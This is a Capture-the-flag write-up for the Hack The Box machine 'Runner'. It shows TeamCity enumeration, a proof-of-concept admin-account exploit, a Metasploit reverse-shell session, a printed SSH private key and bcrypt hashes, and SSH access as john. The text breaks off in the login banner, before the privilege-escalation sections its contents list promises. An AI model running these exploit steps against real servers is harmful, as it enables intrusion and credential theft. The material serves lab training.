---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - Subdomain
  - TeamCity
  - JetBrains
  - CVE-2023-42794
  - RemoteCodeExecution
  - RCE
  - SSHKey
  - Metasploit
  - ContainerMounts
  - portainerio
  - Hashes
  - Cracking
  - CVE-2024-21626
  - runc
  - WorkingDirectoryBreakout
---

![](images/Runner.png)

## Summary

The box gives the hint to look for `TeamCity` on the main page which is running on port `80/TCP`. `Subdomain Enumeration` then show the `subdomain` called `teamcity.runner.htb`. By using a `Proof of Concept (PoC)` exploit it is possible to login on `TeamCity` with a newly created `administrative user` for further enumeration. This step can be skipped by using a already available `module` in `Metassploit` to get a `meterpreter shell` inside a `Docker Container` as `tcuser`. Within this session a `SSH Key` can be found. By enumerating the `buildserver.log` the `username` of `john` can be found. Combining the `username` and the `SSH Key` gives access to the `user.txt`. Within the session of `john` the username of `matthew` shows up. The `privilege escalation` to `matthew` can be achieved by abusing the mounted `/data` directory inside the container. Copying a `bash binary` and make is usable and set the `SUID bit` for everyone to the `datadir` folder enables `john` to use it and to escalate to `matthew`. Checking the `locally running ports` lead to a check of the `vhost configuration` and to a new subdomain called `portainer-administration.runner.htb`. Accessing the portal on port `9443` requires the `password` of `matthew`. The hash of it can be found inside a binary called `buildserver.data` in `teamcity_server/datadir/system/`. With his credentials it is possible to login on `portainer.io`. The `privilege escalation` to `root` can be achieved by using `CVE-2024-21626` which means creating a `new image` to place a `payload` which then get's executed with `root privileges` and makes it possible to read files inside the `/root` directory.

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Enumeration of Port 8000/TCP](#Enumeration-of-Port-8000TCP)
    - [Subdomain Enumeration](#Subdomain-Enumeration)
- [Foothold](#Foothold)
    - [CVE-2023-42793: JetBrains TeamCity Remote Code Execution (RCE)](#CVE-2023-42793-JetBrains-TeamCity-Remote-Code-Execution-RCE)
- [Enumeration](#Enumeration)
- [Privilege Escalation to john](#Privilege-Escalation-to-john)
- [user.txt](#usertxt)
- [Privilege Escalation to matthew](#Privilege-Escalation-to-matthew)
- [Persistence](#Persistence)
- [Pivoting](#Pivoting)
- [LinPEAS](#LinPEAS)
- [Getting Password Hash](#Getting-Password-Hash)
- [Cracking the Hash](#Cracking-the-Hash)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [CVE-2024-21626: runc Working Directory Breakout](#CVE-2024-21626-runc-Working-Directory-Breakout)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)

## Reconnaissance

### Port Scanning

As always we started with `port scanning` and found high port `8000/TCP` besides the usual port `22/TCP` and port `80/TCP`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.48.208
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-20 15:02 EDT
Nmap scan report for 10.129.48.208
Host is up (0.094s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.71 seconds
```

### Enumeration of Port 80/TCP

At first we took a look on the content of port `80/TCP` and got redirected to `runner.htb` which we added to our `/etc/hosts` file.

- [http://10.129.48.208/](http://10.129.48.208/)

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.48.208   runner.htb
```

`WhatWeb` but also a close look on the website itself showed that the boxes uses `TeamCity` at some point.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://runner.htb/
http://runner.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@runner.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.48.208], JQuery[3.5.1], PoweredBy[TeamCity!], Script, Title[Runner - CI/CD Specialists], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

### Enumeration of Port 8000/TCP

On port `8000/TCP` we found nothing than an `API`. Also the output from `Nmap` was a misleading here.

- [http://10.129.48.208:8000/health](http://10.129.48.208:8000/health)

```c
┌──(kali㉿kali)-[~]
└─$ curl http://10.129.48.208:8000/
Not found
```

### Subdomain Enumeration

We found a `subdomain` for `TeamCity` which we also added to our `/etc/hosts` file and accessed it to got greeted by a `login page`.

```c
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -H "Host: FUZZ.runner.htb" -u http://runner.htb/ --fs 154 -t 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 468ms]
:: Progress: [2171687/2171687] :: Job [1/1] :: 41 req/sec :: Duration: [3:43:31] :: Errors: 48 ::
```

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.48.208   runner.htb
10.129.48.208   teamcity.runner.htb
```

- [http://teamcity.runner.htb/login.html](http://teamcity.runner.htb/login.html)

## Foothold

### CVE-2023-42793: JetBrains TeamCity Remote Code Execution (RCE)

A quick `Google` search and we found a `Proof of Concept (PoC)` exploit for `TeamCity` to achieve `Remote Code Execution (RCE)`.

- [https://www.exploit-db.com/exploits/51884](https://www.exploit-db.com/exploits/51884)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Runner/files]
└─$ wget https://www.exploit-db.com/download/51884
--2024-04-20 15:20:50--  https://www.exploit-db.com/download/51884
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4158 (4.1K) [application/txt]
Saving to: ‘51884’

51884                                                      100%[========================================================================================================================================>]   4.06K  --.-KB/s    in 0s      

2024-04-20 15:20:55 (15.6 MB/s) - ‘51884’ saved [4158/4158]

```

The exploit created us a new user with which we could `login` as `Administrator` on `TeamCity`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Runner/files]
└─$ python3 51884 -u http://teamcity.runner.htb

=====================================================
*       CVE-2023-42793                              *
*  TeamCity Admin Account Creation                  *   
*                                                   *
*  Author: ByteHunter                               *
=====================================================

Token: eyJ0eXAiOiAiVENWMiJ9.eGlLYU5nSngyQ0xtaWQyMHlHTTFCaHNWcGNB.YjVlODRjM2ItMzBlOC00OGJhLWFjYjUtNGYzZTEwMTcxNjBk
Successfully exploited!
URL: http://teamcity.runner.htb
Username: city_adminJhIy
Password: Main_password!!**
```

![](images/2024-04-20_15-22_teamcity_login.png)

At this point we could done more enumeration on `TeamCity` but we figured out that there was already a `weaponized version` of the exploit on `Metasploit`. We set the required `options` to receive a `meterpreter shell`.

```c
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Use the edit command to open the currently active module 
in your editor
                                                  

     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`


                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

                     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

                        Press SPACE BAR to continue



       =[ metasploit v6.4.2-dev                           ]
+ -- --=[ 2408 exploits - 1240 auxiliary - 422 post       ]
+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198 
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) >
msf6 > use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198 
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              8111             yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.20        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set RHOST teamcity.runner.htb
RHOST => teamcity.runner.htb
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set LHOST tun0
LHOST => 10.10.14.12
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.05.3 (build 129390) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.dHZzWTdlTWxqdnVXX0JTalk1MVBfakdDZ3NJ.MDAyODhiNGItN2U0Yy00ZDk3LWFlNzktZTliZDNmYmJmZWYx
[*] Uploading plugin: 82CJgHqM
[*] Sending stage (57971 bytes) to 10.129.48.208
[*] Deleting the plugin...
[*] Deleting the authentication token...
[+] Deleted /opt/teamcity/work/Catalina/localhost/ROOT/TC_129390_82CJgHqM
[+] Deleted /data/teamcity_server/datadir/system/caches/plugins.unpacked/82CJgHqM
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.48.208:37946) at 2024-04-20 15:27:32 -0400
[!] This exploit may require manual cleanup of '/opt/teamcity/webapps/ROOT/plugins/82CJgHqM' on the target

meterpreter >
```

## Enumeration

Upgrading our shell lead several times to a `connection issues` which why we proceeded using the shell the box gave us by using the exploit. The user the application was running in was `tcuser` inside a `Docker` environment.

```c
meterpreter > shell
Process 1 created.
Channel 1 created.
id
uid=1000(tcuser) gid=1000(tcuser) groups=1000(tcuser)
```

After doing some enumeration we found an `SSH Key` inside the `pluginData` directory. `TeamCity` would told us also that there was an `SSH Key` but we skipped fairly a huge part of the `enumeration` there. Which was not good.

```c
pwd
/data/teamcity_server/datadir/config/projects/AllProjects/pluginData
```

```c
ls -la
total 12
drwxr-x--- 3 tcuser tcuser 4096 Feb 28 19:56 .
drwxr-x--- 3 tcuser tcuser 4096 Feb 28 19:56 ..
drwxr-x--- 2 tcuser tcuser 4096 Feb 28 19:56 ssh_keys
```

```c
ls
id_rsa
```

```c
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Runner/files]
└─$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
```

Now we had an `SSH Key` but no `username`. We could had found it if we would had a closer look on `TeamCity` but we read the `buildserver.log` on the system after getting a shell to get the `username` of `john` which also worked.

```c
pwd
/data/teamcity_server/datadir/system
```

```c
ls -la
total 1064
drwxr-x---  6 tcuser tcuser   4096 Apr 20 03:00 .
drwxr-xr-x  6 tcuser tcuser   4096 Apr 20 19:49 ..
drwxr-x---  2 tcuser tcuser   4096 Feb 28 10:37 artifacts
-rw-r-----  1 tcuser tcuser 245760 Apr 20 19:27 buildserver.data
-rw-r-----  1 tcuser tcuser     16 Apr 20 20:20 buildserver.lck
-rw-r-----  1 tcuser tcuser 758895 Apr 20 20:20 buildserver.log
-rw-r-----  1 tcuser tcuser     85 Apr 20 03:00 buildserver.properties
-rw-r-----  1 tcuser tcuser  49546 Apr 20 03:00 buildserver.script
drwxr-x---  2 tcuser tcuser   4096 Apr 20 03:00 buildserver.tmp
drwxr-x--- 24 tcuser tcuser   4096 Apr 20 19:27 caches
-rw-r-----  1 tcuser tcuser    147 Apr 20 19:21 dataDirectoryInitialized
drwxr-x--- 12 tcuser tcuser   4096 Feb 28 19:55 pluginData
```

```c
grep admin buildserver.log
INSERT INTO CUSTOM_DATA_BODY VALUES(1,0,1,'buildsToProcess=0\u000acurrentStage=Executing afterCleanup extension (12 of 34): jetbrains.buildServer.vcs.perforce.admin.PerforceCleanupExtension\u000aprocessedBuilds=-1\u000astartTimeKey=1713582000005\u000a',1713582000428)
DELETE FROM CUSTOM_DATA_BODY WHERE ID=1 AND PART_NUM=0 AND TOTAL_PARTS=1 AND DATA_BODY='buildsToProcess=0\u000acurrentStage=Executing afterCleanup extension (12 of 34): jetbrains.buildServer.vcs.perforce.admin.PerforceCleanupExtension\u000aprocessedBuilds=-1\u000astartTimeKey=1713582000005\u000a' AND UPDATE_DATE=1713582000428
INSERT INTO USERS VALUES(1,'admin','$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye','John','john@runner.htb',1713640939231,'BCRYPT')
INSERT INTO USERS VALUES(11,'city_adminjhiy',NULL,NULL,NULL,NULL,NULL)
INSERT INTO VCS_USERNAME VALUES(11,'anyVcs',-1,0,'city_adminJhIy')
INSERT INTO USERS VALUES(11,'city_adminjhiy',NULL,NULL,'angry-admin@funnybunny.org',NULL,NULL)
INSERT INTO USERS VALUES(11,'city_adminjhiy','$2a$07$kgtShAL2GqmmF1r/6r0.euKhNAZvUGmXc/onvcav.knV4ez3cTz7C',NULL,'angry-admin@funnybunny.org',NULL,'BCRYPT')
INSERT INTO AUDIT_ADDITIONAL_OBJECT VALUES(302,0,'SYSTEM_ADMIN','"System administrator"')
INSERT INTO USERS VALUES(11,'city_adminjhiy','$2a$07$kgtShAL2GqmmF1r/6r0.euKhNAZvUGmXc/onvcav.knV4ez3cTz7C',NULL,'angry-admin@funnybunny.org',1713641031005,'BCRYPT')
INSERT INTO USERS VALUES(1,'admin','$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye','John','john@runner.htb',1713641245564,'BCRYPT')
INSERT INTO USERS VALUES(1,'admin','$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye','John','john@runner.htb',1713641738092,'BCRYPT')
```

We tried to crack the hashes but had no luck.

| Username | Hash                                                         |
| -------- | ------------------------------------------------------------ |
| admin    | $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye |
| john     | $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye |

## Privilege Escalation to john

Using the newly found `SSH Key` with `john` provided us access to the box via `SSH`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Runner/files]
└─$ ssh -i id_rsa john@runner.htb
The authenticity of host 'runner.htb (10.129.48.208)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:373: [hashed name]
    ~/.ssh/known_hosts:376: [hashed name]
    ~/.ssh/known_hosts:455: [hashed name]
    ~/.ssh/known_hosts:456: [hashed name]
    ~/.ssh/known_hosts:513: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'runner.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Apr 20 07:42:54 PM UTC 2024

  System load:                      0.2646484375
  Usage of /:                       83.6% of 9.74GB
  Memory usage:                     37%
  Swap usage:                       6%
  Processes:                        231
  Users logged in:                  0
  IPv4 address for br-21746deff6ac: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.48.208
